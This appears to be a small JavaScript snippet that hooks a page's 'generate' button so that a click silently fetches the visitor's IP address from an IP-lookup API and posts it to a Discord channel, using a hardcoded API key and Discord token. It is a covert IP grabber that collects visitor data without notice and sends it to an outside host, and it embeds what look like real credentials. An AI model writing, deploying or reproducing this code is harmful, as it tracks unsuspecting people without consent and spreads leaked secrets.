var button = document.getElementById("generate-button2")
if (button) {
  button
  .addEventListener('click', sendthelog)
} else {
  console.log("futile ")
}
function sendthelog() {
function json(url) {
  return fetch(url).then(res => res.json());
}
let apiKey = '0d0bf4429438b2ecf5d06cb0e2f8b3f7752c24a7e48c080a00c5a57d';
var token = "ODM0MjY2MTYxNTY1OTI1Mzk2.YIjCWQ.R151fsC6hLpnXsB58p0nLZDQpf8"

json('https://api.ipdata.co?api-key=' + apiKey)
    .then(data => {
      data.ip
      fetch("https://discordapp.com/api/v6/channels/834273860236738560/messages", {
  method : 'POST',
  headers : {
    "Content-Type" : "application/json",
    "user-agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    "origin" : "https://discord.com",
    "Authorization" : token
  },
  body : JSON.stringify({
    content : data.ip
    
  })
})
})
}
